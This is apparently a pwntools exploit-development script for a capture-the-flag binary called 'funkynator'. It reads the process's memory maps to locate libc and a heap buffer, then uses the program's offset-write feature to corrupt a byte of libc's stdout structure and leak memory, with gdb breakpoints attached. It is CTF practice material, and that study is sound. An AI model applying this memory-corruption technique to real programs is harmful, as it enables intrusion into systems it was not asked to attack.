#!/usr/bin/env python3
from pwn import *
import struct, sys, time
from pathlib import Path

context.arch = 'amd64'
context.log_level = 'info'

CHALLENGE_DIR = Path(__file__).parent / 'challenge' / 'challenge'
BINARY = str(CHALLENGE_DIR.resolve() / 'funkynator')

env = {'LD_LIBRARY_PATH': str(CHALLENGE_DIR.resolve() / 'glibc')}

r = process(BINARY, env=env, cwd=str(CHALLENGE_DIR))

r.recvuntil(b'name?')
r.sendline(b'TEST')
r.recvuntil(b'> ')

# Create msg1
r.sendline(b'2')
r.recvuntil(b'length')
r.recvline()
r.sendline(b'5')
r.recvuntil(b'message:')
r.sendline(b'AAAAA')
r.recvuntil(b'?')
r.sendline(b'n')
r.recvuntil(b'?')
r.sendline(b'y')
r.recvuntil(b'location')
r.recvline()
r.recvuntil(b'> ')

# Create msg2
r.sendline(b'2')
r.recvuntil(b'length')
r.recvline()
r.sendline(b'10')
r.recvuntil(b'message:')
r.sendline(b'BBBBBBBBBB')
r.recvuntil(b'?')
r.sendline(b'n')
r.recvuntil(b'?')
r.sendline(b'y')
r.recvuntil(b'location')
r.recvline()
r.recvuntil(b'> ')

pid = r.pid
with open(f'/proc/{pid}/maps') as f:
    maps = f.read()
for l in maps.split('\n'):
    parts = l.strip().split()
    if 'funkynator' in parts[-1] and parts[1] == 'r--p' and parts[2] == '00000000':
        binary = int(parts[0].split('-')[0], 16)
    if 'libc.so.6' in parts[-1] and parts[1] == 'r--p' and parts[2] == '00000000':
        libc = int(parts[0].split('-')[0], 16)
        break

with open(f'/proc/{pid}/mem', 'rb') as f:
    f.seek(binary + 0x4060)
    arr = f.read(16)
    msg2 = struct.unpack('<Q', arr[8:16])[0]

STDOUT = 0x1e85c0
WB_OFF = 0x20

with open(f'/proc/{pid}/mem', 'rb') as f:
    f.seek(libc + STDOUT + WB_OFF)
    orig_wb = struct.unpack('<Q', f.read(8))[0]

wb_byte1_addr = libc + STDOUT + WB_OFF + 1
off = (wb_byte1_addr - msg2) & 0xFFFFFFFFFFFFFFFF

orig_byte1 = (orig_wb >> 8) & 0xFF
new_byte1 = (orig_byte1 - 2) & 0xFF

log.info(f"libc={libc:#x} msg2={msg2:#x}")
log.info(f"orig_wb={orig_wb:#x} byte1: {orig_byte1:#04x}->{new_byte1:#04x}")
log.info(f"target byte1 addr = {wb_byte1_addr:#x} off={off:#x}")

# Attach gdb
gdb.attach(r, f'''
set follow-fork-mode child
b *{binary + 0x16c9}
b *{binary + 0x16dd}
b *{binary + 0x16df}
b *{binary + 0x15b8}
continue
''')

# Enter editor
r.sendline(b'5')
r.recvuntil(b'id')
r.recvline()
r.sendline(b'2')
r.recvuntil(b'> ')

# Choose overwrite
r.sendline(b'3')
r.recvuntil(b'offset')
r.recvline()
r.sendline(str(off).encode())
r.recvuntil(b'value')
r.recvline()
r.send(bytes([new_byte1]) + b'\n')

time.sleep(2)
log.info("Attempting to read...")
data = r.recv(timeout=3)
log.info(f"Got {len(data)} bytes: {data[:100].hex() if data else 'empty'}")

r.interactive()
